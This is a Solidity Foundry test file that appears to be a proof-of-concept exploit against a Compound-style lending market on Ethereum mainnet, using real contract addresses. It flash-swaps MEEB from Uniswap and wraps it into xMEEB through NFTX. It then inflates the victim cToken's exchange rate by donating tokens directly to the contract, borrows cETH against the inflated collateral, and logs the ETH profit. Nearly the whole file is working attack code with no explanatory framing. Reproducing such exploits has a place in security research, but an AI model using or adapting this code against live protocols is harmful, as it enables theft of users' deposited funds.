// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/IPoolV2.sol";
import "../src/IFlashLoanReceiver.sol";
import "../src/IERC20.sol";
import "../src/IUniswapV2Router.sol";
import "../src/IUniswapV2Pair.sol";
import "../src/IUnitroller.sol";
import "../src/ICerc20.sol";

interface IWETH is IERC20 {
    function withdraw (uint256 _wag) external;
}

interface IUniswapV2Callee {
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external;
}

interface INFTx {
    function deposit(uint256 vaultId, uint256 _amount) external;
    function withdraw(uint256 vaultId, uint256 _share) external;
}

contract CounterTest is IUniswapV2Callee, Test {

    // Addresses
    address public DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F; //Main
    address public WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;//Main 
    address public WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;//Main
    address public USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7; //Main
    // address public OPEN = 0x69e8b9528CABDA89fe846C67675B5D73d463a916;//Main

    address public MEEB = 0x641927E970222B10b2E8CDBC96b1B4F427316f16;
    address public xMEEB = 0x11Df658567e615f69D23289BE8A27a9C260cE297;
    address public kERC20_1 = 0x8486B523a32e9D0d021078Fe68a3b98fC765FbaB;//Main
    // address public kERC20_2 = 0x2F61a3811cE68FAE0374BD6A1071D2FD5114Df17;//Main
    // address public kERC20_3 = 0x0Fc825B3c2333eAAf277cED5CA239EDa82913be5;//Main uni
    address public UNITROLLER = 0xB70FB69a522ed8D4613C4C720F91F93a836EE2f5;//Main


    address public UNIPAIR = 0xe339c1D0A744053CbCeb0D2dc2d13967c8a69586;//Main token0 Meetb token1 WETH
    address public NFTx = 0x3E135c3E981fAe3383A5aE0d323860a34CfAB893;//Main
    // address public AAVE_POOLV2 = 0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9;//Main  
    // ILendingPool flashPool = ILendingPool(AAVE_POOLV2);// AAVE pool V2
    IUniswapV2Pair uniPair = IUniswapV2Pair(UNIPAIR);
    INFTx nftx = INFTx(NFTx);
    // CErc20Interface victim = CErc20Interface(kERC20_2);
    CErc20Interface victim = CErc20Interface(kERC20_1);
 

    IWETH weth = IWETH(WETH);
    IERC20 dai = IERC20(DAI);
    // IERC20 open = IERC20(OPEN);
    IERC20 meeb = IERC20(MEEB);
    IERC20 xmeeb = IERC20(xMEEB);

    ComptrollerInterface unitroller = ComptrollerInterface(UNITROLLER);

    // function setUp() public {
    //     // counter = new Counter();
    //     // counter.setNumber(0);
    // }

    function testTrade1() public {

        uint256 token_amount = meeb.balanceOf(UNIPAIR) - 1;
        // uint256 dai_amount = dai.
        // dai.approve(AAVE_POOLV2, uint256(2**256-1));

        // address[] memory assets = new address[](1);
        // assets[0] = DAI;
        // // assets[1] = WBTC;
        // uint256[] memory amounts = new uint256[](1);
        // amounts[0] = dai_amount;
        // // amounts[1] = dai_amount;
        // uint256[] memory modes = new uint256[](1);
        // modes[0] = 0;
        // // modes[1] = 0;

        // // bytes memory data = abi.encode(wbtc_amount, dai_amount, exchangeRateUpdated);

        // flashPool.flashLoan(address(this), assets, amounts, modes, address(this), hex"", uint16(0));
        uniPair.swap(token_amount, 0, address(this), hex"00");


    }


    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) 
        external 
        override  
    {   
        amount0;
        require(sender == address(this));
        uint256 ethAmount0 = payable(address(this)).balance;   

        mintXmeeb(amount0);

        address[] memory cTokens = new address[](1);
        cTokens[0] = kERC20_1;  
        uint[] memory errors = unitroller.enterMarkets(cTokens);

        xmeeb.approve(kERC20_1, balanceOfThis(xMEEB));    
        victim.mint(balanceOfThis(xMEEB));
    
        {
        
            // console.log(errors[0]);

            
            victim.redeem(victim.balanceOf(address(this))-2);
            console.log(victim.exchangeRateStored());
            uint256 transferAmount = balanceOfThis(xMEEB);
            xmeeb.transfer(kERC20_1, transferAmount);
        
            
            // console.log(victim.exchangeRateStored());
        
       
            // (uint a, uint b, uint c) = unitroller.getAccountLiquidity(address(this));
            // console.log("a :",a);
            // console.log("b :",b);
            // console.log("c :",c);
         
            CErc20Interface(0xD72929e284E8bc2f7458A6302bE961B91bccB339).borrow(9*10**17);//cETH
            console.log("Before :",victim.balanceOf(address(this)));
            victim.redeemUnderlying(transferAmount);
            console.log("xMEEB after balance :",balanceOfThis(xMEEB));
            console.log("After :",victim.balanceOf(address(this)));
            uint256 ethAmount = payable(address(this)).balance;
            console.log("Final ETH balance :",ethAmount-ethAmount0);
        }
    
    }

    function mintXmeeb(uint amount)internal{
        console.log("Meeb balance :",amount);
        meeb.approve(NFTx, amount);
        nftx.deposit(7,amount);
        console.log("xMeeb balance :",balanceOfThis(xMEEB));
    }

      function balanceOfThis(address _erc20TokenAddress) internal view returns (uint256 bal) {
        IERC20 ERC20Token;    
        ERC20Token = IERC20(_erc20TokenAddress);
   
        bal = ERC20Token.balanceOf(address(this));
        // console.log("Executor Token balance", bal);
        return bal;   

    }

    receive()external payable {}

}